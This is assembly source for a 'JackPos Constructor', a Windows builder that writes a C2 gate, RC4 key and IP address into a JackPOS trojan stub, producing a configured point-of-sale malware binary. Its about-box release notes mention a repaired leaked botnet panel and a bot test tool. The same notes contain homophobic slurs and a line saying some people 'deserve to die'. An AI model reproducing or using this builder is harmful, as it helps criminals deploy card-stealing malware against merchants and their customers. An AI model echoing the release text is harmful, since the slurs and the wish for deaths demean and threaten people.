.386
.model	flat, stdcall
option	casemap :none
;https://www.virustotal.com/en/file/ee46e8d727793a9601b51d5e73a675863b65fc0ac4ae41e50c1ff9e1c574efa6/analysis/1398363511/
include			\masm32\include\windows.inc
include			\masm32\include\user32.inc
include			\masm32\include\kernel32.inc
include			\masm32\include\shell32.inc
include			\masm32\include\advapi32.inc
include			\masm32\include\gdi32.inc
include			\masm32\include\comctl32.inc
include			\masm32\include\comdlg32.inc
include			\masm32\include\masm32.inc
include			\masm32\macros\macros.asm
includelib		\masm32\lib\user32.lib
includelib		\masm32\lib\kernel32.lib
includelib		\masm32\lib\shell32.lib
includelib		\masm32\lib\advapi32.lib
includelib		\masm32\lib\gdi32.lib
includelib		\masm32\lib\comctl32.lib
includelib		\masm32\lib\comdlg32.lib
includelib		\masm32\lib\masm32.lib
includelib 		\masm32\lib\winmm.lib
include		WaveObject.asm
include			ufmod.inc
includelib			ufmod.lib

DlgProc		          Proto		:DWORD,:DWORD,:DWORD,:DWORD 
Aboutproc			  Proto		:DWORD,:DWORD,:DWORD,:DWORD 
List		          Proto		:DWORD,:DWORD
Patch		          Proto		:DWORD,:DWORD,:DWORD
FadeIn 				PROTO :DWORD
FadeOut 			PROTO :DWORD

.data
Transparency		dd		?
TRANSPARENT_VALUE	equ 200							;Opacity Value ( max value is 254 )
ProgId       	db "Trojan/Win32.Jackpos Constructor",0             
TargetName	 	equ "- Trojan/Win32.Jackpos -",0                           
TargetName2	 	equ "stub.vir",0                                        
NameofTarget 	db TargetName,0
SecondN	 		db "malware.ViR",0
szTitle		db		'Error',0
szError		db		'An error has occured',0

Sequence		db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
				db	00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h

WBuffer			db	256 dup(00)
WBuffer2		db	256 dup(00)
WBuffer3		db	256 dup(00)

FileFilter		db	TargetName2,0

;About Settings:--------------------------------------------------------\
String   	db 'Xylitol',0Ah
		db 'Proudly presents',0Ah
		db 0Ah		
		db 'JackPos.v1.0.fix.and.patch-XYLiBOX',0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 'RELEASE iNFO ---------------',0Ah
		db 'Supplier: pokeh',0Ah
		db 'Type: Patch+PHP fix',0Ah
		db 'Code: Xylitol',0Ah
		db 'GFX: [x]sp!d3r',0Ah
		db 'SFX: Jesper Kyd / Silents',0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 'RELEASE NOTES --------------',0Ah
		db 0Ah
		db 'This release is not intended',0Ah
		db 'For malicious activity',0Ah
		db 'but as proof of concept for',0Ah
		db 'educational demonstration only',0Ah
		db 0Ah
		db 'The JackPos panel is based on the',0Ah
		db 'leaked broken package',0Ah
		db 'and required us to fix the code',0Ah
		db 'some files are still missing',0Ah
		db 'but overall, panel is working now',0Ah
		db 0Ah
		db 'This release is also provided',0Ah
		db 'with grabtest.exe',0Ah
		db 'to test your local botnet',0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 'GROUP NEWS -----------------',0Ah 
		db 0Ah
		db 'There are many scene fuckers,',0Ah 
		db 'who tried, and still trying to',0Ah 
		db 'fuck with us! We really dont',0Ah 
		db 'give a shit about them.',0Ah 
		db 'all we do is laugh about the fuckers',0Ah 
		db 'who are proofing their gayness',0Ah 
		db 'everytime.',0Ah 
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
        db 'FUCKiNGS -------------------',0Ah 
		db 0Ah
		db 'There are some people who really',0Ah
		db 'deserve something like this.',0Ah
		db 'Some of them deserve to die.',0Ah
		db 'The big fuck goes to...',0Ah
		db 0Ah
		db 'everybody who tries to make',0Ah
		db 'profit from pirated software',0Ah
		db 'Fuck you capitalistic bastards!',0Ah
		db 0Ah
		db 'everybody who rip or steal other',0Ah
		db 'people releases, fuck you lamers!',0Ah
		db 0Ah
		db 'everybody who likes or supports',0Ah
		db 'the carding scene, fuck you.',0Ah
		db 0Ah
        db 'everybody who tries to screw a',0Ah
        db 'hardworking scener..',0Ah
        db 0Ah
		db 'everybody who likes or supports',0Ah
		db 'the P2P scene, fuck you',0Ah
		db 'the scene should be as it was.',0Ah
		db 0Ah
		db 'everybody who thinks Xylibox',0Ah
		db 'is a carding group.',0Ah
		db 'really, fuck you.',0Ah
		db 0Ah
		db 'everybody of these communities',0Ah
		db 'CPRO - OMERTA - iNFRAUD - VOR',0Ah
		db 'LAMPEDUZA - VERIFIED - CRDCLUB',0Ah
		db 'fuck you lamers',0Ah
		db 0Ah
		db 'The biggest fuck goes to',0Ah
		db 'a gay community of latin',0Ah
		db 'america kids on the net',0Ah
		db 'fuck you Jonathan.',0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 'GREETiNGS ------------------',0Ah
		db 0Ah
		db 'We want to greet all hardworking',0Ah
		db ' sceners who did their best to keep',0Ah
		db 'the scene alive!',0Ah
		db 'We want to greet al our friends in',0Ah
		db 'Zenk-Security and Corrupt-Net',0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
        db 'CONTACT --------------------',0Ah
		db 0Ah
		db 'Before contacting us,',0Ah
		db 'read the following notes:',0Ah
		db 0Ah
		db 'Do not ask us for file passwords!',0Ah
		db 'Do not ask us for missing files!',0Ah
		db 'Do not ask us for any crack!',0Ah
		db 'Do not ask us to crack!',0Ah
		db 'Do not ask us how to crack!',0Ah
		db 'Do not ask us where you can',0Ah
		db 'get our releases!',0Ah
		db 'Do not ask us if you get',0Ah
		db 'any technical issues!',0Ah
		db 'Do not ask us to crack',0Ah
		db 'something for you!',0Ah
		db 'Do not ask us how to make',0Ah
		db 'a patcher/keygen!',0Ah
		db 0Ah
		db 'So, do NOT waste our time with',0Ah
		db 'stupid questions, we wont reply',0Ah
		db 'if you didnt read the above!',0Ah
		db 0Ah
		db 'iRC: irc.malwaretech.com',0Ah
		db 'iCQ: 395802',0Ah
		db 'MAiL: xylitol@malwareint.com',0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 0Ah
		db 'X y l i b o x  L a b s',0Ah
		db 0Ah	
		db '- 2 4 / o 5 / 1 4 -',0Ah
		db 0Ah,0
aTahoma	db 'Lucida Console',0

hFont			dd 0
dword_40E510	dd 0
number			dd 0 
dword_40CCA0	dd 0
dword_40CCA4	dd 0
dword_40CCB8	dd 0
dword_40CD24	dd 0
				dd 1F2h	dup(0)
dword_40DCC4	dd 0
				dd 1F3h	dup(0)
dword_40D4F0	dd 0
dword_40D4F4	dd 0
				dd 1F3h	dup(0)
.data? 
hInstance		HINSTANCE		?  
hTarget			HINSTANCE		?
hTargetMap		HINSTANCE		?
ofn				OPENFILENAME	<>
RBuffer			dd				?
BytesRead		db				?
BytesWritten	db				?
pMapView		dd				?
FileSize		dd				?
SearchOffset	dd				?
xWin 			dd 				?
hBitmap 		dd 				?
bitmp			dd		 		?
stWaveObj   	WAVE_OBJECT		<?>
handle		dd		?

hMapping		dd				?
pMapping		dd				?
TargetN	    	db				512 dup(?)
inBytes			db				512 dup(?)

alen  			db 				?
bb		db				?

ScrollMainDC	HDC	?
ScrollBackDC	HDC	?
Tick	        dd	?
ScrollBitmap	HBITMAP	?
dword_40CD18	dd	?
Rect		RECT	<>
Paint	PAINTSTRUCT	<>

dword_40E498	dd	?
TextLen	      		dd	?
dword_40E508	dd	?
dword_40E50C	dd	?
GoDown	  		db	?
dword_40E504	dd	?



.const
IDD_CRACKME	    equ	101
IDC_PATCH 	    equ	2001
IDC_EXIT        equ 2002
IDC_ABOUT       equ 2003
icon		    equ	2000
IDC_TARGET      equ 2006
IDC_LISTBOX	    equ	1002
IDC_BYTES		equ 2012
DELAY_VALUE		equ		10
.code 
 xstart: 
    invoke GetModuleHandle, NULL 
    mov    hInstance,eax 
    invoke InitCommonControls
    invoke DialogBoxParam, hInstance, IDD_CRACKME, NULL, addr DlgProc, NULL 
    invoke ExitProcess,eax

align dword
DlgProc proc hWnd:DWORD,uMsg:DWORD,wParam:DWORD,lParam:DWORD
 			local	@stPs:PAINTSTRUCT,@hDc,@stRect:RECT
		local	@stBmp:BITMAP
   LOCAL hMemDC:HDC
    invoke LoadCursor,hInstance,300 
 	invoke SetCursor,eax
    .if uMsg == WM_INITDIALOG
invoke FadeIn,hWnd
invoke LoadBitmap,hInstance,1
		mov hBitmap,eax
		invoke	GetDlgItem,hWnd,1008
		push    hBitmap
		invoke  _WaveInit,addr stWaveObj,eax,hBitmap,30,0
		.if eax
			invoke  MessageBox,hWnd,addr szError,addr szTitle,MB_OK or MB_ICONSTOP
			call    _Quit
		.else
		.endif
		pop hBitmap
		invoke  DeleteObject,hBitmap
		invoke  _WaveEffect,addr stWaveObj,1,5,4,250
	invoke LoadIcon,hInstance,icon
	invoke SendMessage,hWnd,WM_SETICON,ICON_SMALL, eax
	


	invoke GetDlgItem,hWnd,IDC_BYTES
	invoke SendMessage, eax, EM_SETLIMITTEXT,64,0			;limite l'ecriture sur le texte box à 64 chars

	invoke GetDlgItem,hWnd,2017
	invoke SendMessage, eax, EM_SETLIMITTEXT,64,0			;limite l'ecriture sur le texte box à 64 chars

	invoke GetDlgItem,hWnd,2020
	invoke SendMessage, eax, EM_SETLIMITTEXT,64,0			;limite l'ecriture sur le texte box à 64 chars
	
	invoke SendMessage,hWnd,WM_SETICON,1,eax	
	invoke SetWindowText,hWnd, addr ProgId
	invoke SetDlgItemText,hWnd,IDC_TARGET,addr NameofTarget

    invoke List,hWnd,chr$("[*] Run as Administrator")
    invoke List,hWnd,chr$("[*] Click build then select stub.vir")
    invoke List,hWnd,chr$("[*] Waiting...")

	invoke SetFocus,eax 
	
	 .elseif uMsg == WM_PAINT
      invoke BeginPaint,hWnd,addr @stPs
      mov @hDc,eax
      invoke CreateCompatibleDC,@hDc
      mov hMemDC,eax
      invoke SelectObject,hMemDC,hBitmap
      invoke GetClientRect,hWnd,addr @stRect
      invoke BitBlt,@hDc,10,10,@stRect.right,@stRect.bottom,hMemDC,0,0,MERGECOPY
      invoke DeleteDC,hMemDC
      invoke _WaveUpdateFrame,addr stWaveObj,eax,TRUE
      invoke EndPaint,hWnd,addr @stPs
            xor eax,eax
            ret
	
.elseif uMsg == WM_COMMAND
       mov eax,wParam
       

.if eax==IDC_PATCH

			invoke GetDlgItemText,hWnd,IDC_BYTES,addr WBuffer,sizeof WBuffer
			.if eax == 0 || eax > 64
				invoke List,hWnd,chr$("Gate field is either empty or has more than 64 chars!")
				ret
			.endif

			invoke GetDlgItemText,hWnd,2017,addr WBuffer2,sizeof WBuffer2
			.if eax == 0 || eax > 64
				invoke List,hWnd,chr$("RC4 field is either empty or has more than 64 chars!")
				ret
			.endif
			
			invoke GetDlgItemText,hWnd,2020,addr WBuffer3,sizeof WBuffer3
			.if eax == 0 || eax > 64
				invoke List,hWnd,chr$("IP field is either empty or has more than 64 chars!")
				ret
			.endif

			mov ofn.lStructSize,SIZEOF ofn 
			mov ofn.lpstrFilter,offset FileFilter
			mov ofn.lpstrFile,offset TargetN 
			mov ofn.nMaxFile,512 
			mov ofn.Flags,OFN_FILEMUSTEXIST+OFN_PATHMUSTEXIST+\
							OFN_LONGNAMES+OFN_EXPLORER+OFN_HIDEREADONLY 
			invoke GetOpenFileName,addr ofn
			.if eax==TRUE
				invoke CopyFile, addr TargetN, addr SecondN,TRUE

				invoke GetFileAttributes,addr SecondN
				.if eax!=FILE_ATTRIBUTE_NORMAL
					invoke SetFileAttributes,addr SecondN,FILE_ATTRIBUTE_NORMAL
				.endif

				invoke CreateFile,addr SecondN,GENERIC_READ+GENERIC_WRITE,FILE_SHARE_READ+FILE_SHARE_WRITE,\
																NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
				.if eax!=INVALID_HANDLE_VALUE
					mov hTarget,eax
					invoke List,hWnd,chr$("[*] Analysing offsets...")

					mov ebx,64
					invoke Patch,hWnd,00021A00h,addr WBuffer

					xor ebx,ebx
					mov ebx,64
					invoke Patch,hWnd,00021B00h,addr WBuffer2

					xor ebx,ebx
					mov ebx,64
					invoke Patch,hWnd,00021BC0h,addr WBuffer3
					
					.if eax==0
						invoke List,hWnd,chr$("[!] Invalid Stub, or already patched.(Stub MD5: ba4820fe8ef8e16487608098ccc70d6b)")
						invoke List,hWnd,chr$("[!] Nothing patched, Aborted*")
					.elseif eax==1
						invoke List,hWnd,chr$("[+] Offsets patched, Creating Backup...")
						invoke List,hWnd,chr$("[+] Target patched successfully, n-j0y.")
					.elseif eax==2
						invoke List,hWnd,chr$("Invalid File version, or already patched.")
						invoke List,hWnd,chr$("Nothing patched, Aborted*")
					.endif

				.else
					invoke List,hWnd,chr$("[*] Analysing offsets...")
					invoke List,hWnd,chr$("[!] File Already open, close the file and retry.")
					invoke List,hWnd,chr$("[!] Nothing patched, Aborted*")
				.endif
				invoke CloseHandle,hTarget
				
			.endif
			
			

.elseif eax==IDC_EXIT
	invoke SendMessage,hWnd,WM_CLOSE,0,0
.elseif eax==IDC_ABOUT
invoke uFMOD_PlaySong,666,hInstance,XM_RESOURCE
	invoke DialogBoxParam, hInstance, 102, hWnd, addr Aboutproc, NULL 
	invoke uFMOD_PlaySong,0,0,0
.endif
.endif
	.if uMsg==WM_RBUTTONDOWN
			invoke ShowWindow,hWnd,SW_MINIMIZE
	.endif
	
		.if	uMsg ==	WM_LBUTTONDOWN
			mov	eax,lParam
			movzx	ecx,ax		; x
			shr	eax,16		; y
			invoke	_WaveDropStone,addr stWaveObj,ecx,eax,2,256
			.endif
	.if uMsg== WM_MOUSEMOVE
			mov	eax,lParam
			movzx	ecx,ax		; x
			shr	eax,16		; y
			invoke	_WaveDropStone,addr stWaveObj,ecx,eax,2,256
	.endif
.if	uMsg == WM_CLOSE
call _Quit
		invoke	EndDialog, hWnd, 0
.endif

    xor	eax,eax
    ret 

ret
DlgProc endp

List proc hWnd:HWND, pMsg:DWORD
	invoke SendDlgItemMessage,hWnd,IDC_LISTBOX,LB_ADDSTRING,0,pMsg 
	invoke SendDlgItemMessage,hWnd,IDC_LISTBOX,WM_VSCROLL,SB_BOTTOM,0
	Ret
List EndP

_Quit proc
invoke	_WaveFree,addr stWaveObj
invoke	DestroyWindow,xWin
invoke	PostQuitMessage,NULL
ret
_Quit endp

FadeOut	proc hWnd:HWND
mov Transparency,250
@@:
invoke SetLayeredWindowAttributes,hWnd,0,Transparency,LWA_ALPHA
invoke Sleep,DELAY_VALUE
sub Transparency,5
cmp Transparency,0
jne @b
ret
FadeOut EndP

FadeIn	proc hWnd:HWND
invoke ShowWindow,hWnd,SW_SHOW
mov Transparency,250
@@:
invoke SetLayeredWindowAttributes,hWnd,0,Transparency,LWA_ALPHA
invoke Sleep,DELAY_VALUE
add Transparency,5
cmp Transparency,255
jne @b
ret
FadeIn EndP

Patch proc hWnd:HWND,pOffset:DWORD,Watermark:DWORD
		invoke SetFilePointer,hTarget,pOffset,NULL,FILE_BEGIN
		invoke ReadFile,hTarget,addr RBuffer,ebx,addr BytesRead,NULL
		.if BytesRead==bl
			mov eax,dword ptr [RBuffer]
			.if eax==dword ptr [Sequence]
				invoke SetFilePointer,hTarget,pOffset,NULL,FILE_BEGIN	
				invoke WriteFile,hTarget,Watermark,ebx,addr BytesWritten,NULL
				.if BytesWritten==bl
					mov eax,1
					ret
				.else
					mov eax,0
					ret
				.endif
			.elseif eax==dword ptr [Watermark]
				mov eax,2
				ret
			.endif
		.endif
	ret         
Patch EndP

Aboutproc proc hWin:DWORD,uMsg:DWORD,wParam:DWORD,lParam:DWORD

	mov	eax,uMsg
	push hWin
	pop handle
	.if	eax == WM_INITDIALOG
                     push esi
		call InitScroller
	.elseif eax==WM_RBUTTONUP
		invoke KillTimer,hWin,7Bh
		invoke KillTimer,hWin,141h
		invoke DeleteObject,ScrollMainDC
		invoke DeleteObject,ScrollBackDC
		invoke SendMessage,hWin,WM_CLOSE,0,0
	    invoke ShowWindow,hWin, SW_HIDE

	.elseif eax==WM_TIMER
		call	SetupScroll
		call	DrawStars
		call	ScrollMain
		call	UpdateScroll
	.elseif eax==WM_LBUTTONDOWN
		invoke SendMessage,hWin,WM_NCLBUTTONDOWN,HTCAPTION,0
		
	.elseif	eax == WM_CLOSE
	invoke	EndDialog, hWin, 0
	.endif
	xor	eax,eax
	ret
Aboutproc endp

align dword
_rand proc
	mov eax,Tick
	imul eax,eax,0A999h
	add eax,0269EC3h
	mov Tick,eax
	sar eax,010h
	and eax,0FFFFh
	Ret
_rand EndP
align dword
InitScroller Proc
	mov	edi, offset String
	or	ecx, 0FFFFFFFFh
	xor	eax, eax
	xor	edx, edx
	mov	esi, 1
	repne scasb
	not	ecx
	dec	ecx
	mov	TextLen, esi
	jz	short loc_401C7C

loc_401C58:
	cmp	byte ptr String[edx], 0Ah
	jnz	short loc_401C62
	inc	esi

loc_401C62:
	mov	edi, offset String
	or	ecx, 0FFFFFFFFh
	xor	eax, eax
	inc	edx
	repne scasb
	not	ecx
	dec	ecx
	cmp	edx, ecx
	jb	short loc_401C58
	mov	TextLen, esi

loc_401C7C:
	mov	dword_40E508, 0FFFFFFD8h
	mov	dword_40E50C, 0A0h
	mov	GoDown, 0
	mov	dword_40E504, 0
	
	call	FirstSetup
	xor	esi, esi

loc_401CA8:
	call	_rand
	cdq
	mov	ecx, 15Eh
	idiv	ecx
	mov	edi, edx
	call	_rand
	cdq
	mov	ecx, 0AFh
	idiv	ecx
	lea	edx, [edi+edx-15Eh]
	mov	dword_40CD24[esi*4], edx
	call	_rand
	cdq
	mov	ecx, 0A0h
	idiv	ecx
	mov	edi, edx
	call	_rand
	cdq
	mov	ecx, 50h
	idiv	ecx
	lea	eax, [esi+4Bh]
	mov	dword_40DCC4[esi*4], eax
	inc	esi
	cmp	esi, 1F4h
	lea	edx, [edi+edx-0A0h]
	mov	dword_40D4F0[esi*4], edx
	jl	short loc_401CA8
	
	invoke SetTimer,handle,123,20,0
	invoke SetTimer,handle,321,143000,0
InitScroller EndP
align dword
FirstSetup	proc
	invoke GetDC,handle
	mov ScrollMainDC,eax
	invoke GetWindowRect,handle,addr Rect
	invoke CreateCompatibleDC,ScrollMainDC
	mov ScrollBackDC,eax		
	invoke CreateCompatibleBitmap,ScrollMainDC,Rect.left,Rect.top
	mov	ScrollBitmap, eax
	invoke SelectObject,ScrollBackDC,ScrollBitmap
	invoke DeleteObject,ScrollBitmap
	invoke DeleteObject,addr Rect
	ret
	
FirstSetup	endp
align dword
DrawStars	proc	
		push ebx
		mov	ebx, SetPixelV
		push	 esi
		push	 edi
		xor	edi, edi

loc_40141B:
		mov	eax, dword_40CD24[edi*4]
		mov	esi, dword_40DCC4[edi*4]
		push 	0h		; COLORREF
		lea	eax, [eax+eax*2]
		lea	eax, [eax+eax*4]
		lea	eax, [eax+eax*4]
		shl	eax, 1
		cdq
		idiv	esi
		mov	ecx, eax
		mov	eax, dword_40D4F4[edi*4]
		imul	eax, 64h
		cdq
		idiv	esi
		add	ecx, 0AFh
		mov	dword_40CCA0, ecx
		add	eax, 50h
		mov	dword_40CCA4, eax
		push	eax		; int
		mov	eax, ScrollBackDC
		push	ecx		; int
		push	eax		; HDC
		call	ebx ; SetPixelV
		mov	eax, dword_40DCC4[edi*4]
		lea	ecx, [eax-1]
		mov	eax, dword_40CD24[edi*4]
		mov	dword_40DCC4[edi*4], ecx
		lea	eax, [eax+eax*2]
		lea	eax, [eax+eax*4]
		lea	eax, [eax+eax*4]
		shl	eax, 1
		cdq
		idiv	ecx
		mov	esi, eax
		mov	eax, dword_40D4F4[edi*4]
		imul	eax, 70h
		cdq
		idiv	ecx
		add	esi, 0AFh
		mov	dword_40CCA0, esi
		add	eax, 65h
		cmp	ecx, 0FFh
		mov	dword_40CCA4, eax
		jl	short loc_4014BE
		mov	edx, 50h
		jmp	short loc_4014C5

loc_4014BE:
		mov	edx, 0FFFh
		sub	edx, ecx

loc_4014C5:
		mov	ecx, edx
		mov	dword_40CCB8, edx
		and	ecx, 0FFh
		mov	edx, ecx
		shl	edx, 5
		or	edx, ecx
		shl	edx, 5
		or	edx, ecx
		push	edx		; COLORREF
		push	eax		; int
		mov	eax, ScrollBackDC
		push	esi		; int
		push	eax		; HDC
		call	ebx ; SetPixelV
		cmp	dword_40DCC4[edi*4], 1
		jg	short loc_401552
		call	_rand
		cdq
		mov	ecx, 15Eh
		idiv	ecx
		mov	esi, edx
		call	_rand
		cdq
		mov	ecx, 0AFh
		idiv	ecx
		lea	edx, [esi+edx-15Eh]
		mov	dword_40CD24[edi*4], edx
		call	_rand
		cdq
		mov	ecx, 0A0h
		idiv	ecx
		mov	esi, edx
		call	_rand
		cdq
		mov	ecx, 50h
		idiv	ecx
		lea	eax, [edi+4Bh]
		mov	dword_40DCC4[edi*4], eax
		lea	edx, [esi+edx-0A0h]
		mov	dword_40D4F4[edi*4], edx

loc_401552:
		inc	edi
		cmp	edi, 1F4h
		jl	loc_40141B
		pop	edi
		pop	esi
		pop	ebx
		ret
DrawStars	endp
align dword
SetupScroll proc
	invoke GetWindowRect,handle,addr Rect
	invoke BeginPaint,handle,addr Paint
	invoke BitBlt,ScrollBackDC,0,0,Rect.right,Rect.bottom,0,0,0,BLACKNESS
	invoke EndPaint,handle,addr Paint
	invoke DeleteObject,addr Paint
	invoke DeleteObject,addr Rect
	ret

SetupScroll	endp
align dword
ScrollMain	proc
		mov	ecx, dword_40E510
		mov	edx, dword_40E508
		mov	eax, dword_40E50C
		add	ecx, edx
		mov	dl, GoDown
		mov	Rect.left, ecx
		mov	ecx, TextLen
		mov	Rect.top, eax
		test	dl, dl
		lea	ecx, [ecx+ecx*4+28h]
		mov	Rect.right, 15Eh
		lea	ecx, [eax+ecx*4]
		mov	Rect.bottom, ecx
		jnz	short loc_4012FC
		mov	edx, dword_40E504
		cmp	edx, 2
		jz	short loc_4012D4
		test	edx, edx
		jnz	short loc_4012E6

loc_4012D4:
		dec	eax
		mov	dword_40E504, 1
		mov	dword_40E50C, eax
		jmp	short loc_4012ED


loc_4012E6:
		inc	edx
		mov	dword_40E504, edx

loc_4012ED:
		neg	ecx
		cmp	eax, ecx
		jge	short loc_401332
		mov	GoDown, 1
		jmp	short loc_401332


loc_4012FC:
		mov	ecx, dword_40E504
		cmp	ecx, 1
		jz	short loc_40130B
		test	ecx, ecx
		jnz	short loc_40131D

loc_40130B:
		inc	eax
		mov	dword_40E504, 1
		mov	dword_40E50C, eax
		jmp	short loc_401324


loc_40131D:
		inc	ecx
		mov	dword_40E504, ecx

loc_401324:
		cmp	eax, 0A0h
		jle	short loc_401332
		mov	GoDown, 0

loc_401332:
		mov	edx, ScrollBackDC
		push	esi
		push	edi
		
		;nHeight = -MulDiv(PointSize, GetDeviceCaps(hDC, LOGPIXELSY), 72);
	
		push	48h		; nDenominator
		push	5Ah		; int
		push	edx		; HDC
		call	GetDeviceCaps
		
		invoke GetDeviceCaps,ScrollBackDC,LOGPIXELSY
		push	eax		; nNumerator
		push	8		; nNumber
		call	MulDiv
		
		push	offset aTahoma ;Tahoma
		push	0		; DWORD
		push	0		; DWORD
		push	0		; DWORD
		push	0		; DWORD
		push	0		; DWORD
		push	0		; DWORD
		push	0		; DWORD
		push	0		; DWORD
		push	2BCh	; int
		push	0		; int
		push	0		; int
		neg	eax
		push	0		; int
		push	eax		; int
		mov	number, eax
		call	CreateFontA
		mov	hFont, eax
		
		invoke SelectObject,ScrollBackDC,hFont
		invoke SetTextColor,ScrollBackDC,0000FB00h   ;Colour of Scroller text in About
		invoke SetBkColor,ScrollBackDC,0000FB00h
		invoke SetBkMode,ScrollBackDC,TRANSPARENT
		
		mov	edi, offset String
		or	ecx, 0FFFFFFFFh
		xor	eax, eax
		repne scasb
		not	ecx
		dec	ecx
		invoke DrawText,ScrollBackDC,addr String,ecx,addr Rect,DT_CENTER
		invoke DeleteObject,hFont
		invoke DeleteObject,addr Rect


		pop	edi
		pop	esi
		ret
ScrollMain	endp
align dword
UpdateScroll	proc
	invoke GetDC,handle
	mov	ScrollMainDC, eax
	invoke GetWindowRect,handle,addr Rect
	invoke BeginPaint,handle,addr Paint
	invoke BitBlt,ScrollMainDC,0,0,Rect.right,Rect.bottom,ScrollBackDC,0,0,SRCCOPY
	invoke EndPaint,handle,addr Paint
	invoke DeleteObject,addr Paint
	invoke DeleteObject,addr Rect
	ret
UpdateScroll	endp

align dword
end xstart